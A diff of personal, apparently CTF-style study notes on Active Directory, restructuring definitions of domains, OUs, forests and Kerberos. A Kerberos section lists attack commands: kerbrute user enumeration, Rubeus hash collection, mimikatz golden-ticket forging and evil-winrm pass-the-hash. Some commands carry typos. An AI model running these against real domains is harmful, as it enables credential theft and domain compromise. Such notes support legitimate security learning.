@@ -122,13 +122,61 @@
   - Regular users RID >= 1000
   - wmic useraccount get name,sid
 
-# ACTIVE DIRECTORY
+# ACTIVE DIRECTORY DOMAIN SERVICE (AD DS)
 - Definitions
-  - Domain Controler: provide AD services + control all
-  - Org Units: containers inside AD
-  - Active Directory Objects: user, group, component, printer
+  - Domain: group of users/computers under a adm
+  - Domain Controler: server that runs AD. Provides AD services + control all
+  - AD: repository/database where this users/computers are
+  - Organizational Unit (OU): containers inside AD, classify user/machines. Apply policies
+    - Group Policy Objects
+      - network distribution: gpupdate /force
+      - SYSVOL: shared networ
   - AD Domains: collection of components within AD
-  - Forestr: domains trust each other
+  
+- Tree: several domains
+- Forestr: domains trust each other
+  - Union several trees + different namespace
+  - Trust Relationshing
+- Enterprese Admins: over all domains
+
+- Objects
+  - User:
+    - People
+    - Service: database, printer, service user
+  - Machines
+    - computer that joins AD domain
+    - local administrator on machine self
+    - password rotated + 120 characters
+    - DC01 = machnie name | DC01$ = machine account name
+  - Security Groups
+    - groups and machines
+    - Domain Admin, Server|Backup|Account Operators, Domain Users|COmputer|Controllers
+    - grant permission over resources
+
+- Credentials
+  - Domain Controllers
+    - Kerberos
+    - NetNTLM
+
+## KERBEROS
+- authentication service
+- ticket system
+- Steps
+  - Key Distribution Center (KDC) ==> generate Ticket Granting Ticket (TGT) ==> Ticket Granting Service
+- Enumerate users
+  - kerbrute userenum -d domain --dc domain string wordlist.txt
+- Rubel.exe (in the victim's machine) to find hashes
+- mimikatz for golden ticket
+  - lsadump::lsa /inject /name:USERNAME
+  - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
+  - msic::cmd ==> access other machine
+
+## Commands
+- Reset password
+  - set-ADAccountPassword USER -Reset -NewPassword (Read-Host -AsSecurestring -Prompt '123456') - Verbose
+  - Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose
+
+
 
 
 ## ENUMERATING
@@ -199,8 +247,6 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
 - Tools
   - seatbelt: https://github.com/GhostPack/Seatbelt
 
-
-
 # COMMANDS
 - systeminfo ==> command
   - Os config + Domain
@@ -223,16 +269,7 @@ olcSaslSecProps: noanonymous,minssf=0,passcred
 - Pass the hash
   - evil-winrm -i IP -u USERNAME -H hash
 
-# KERBEROS
-- authentication service
-- ticket system
-- Enumerate users
-  - kerbrute userenum -d domain --dc domain string wordlist.txt
-- Rubel.exe (in the victim's machine) to find hashes
-- mimikatz for golden ticket
-  - lsadump::lsa /inject /name:USERNAME
-  - kerberos::golden /user:[logged_user] /domain:[name_domain] /sid: /krbtgt:[hash_des_Nutzers] /id:
-  - msic::cmd ==> access other machine
+
 
 # PERSISTANCE
 - Identify segemtns: vlans, dmz
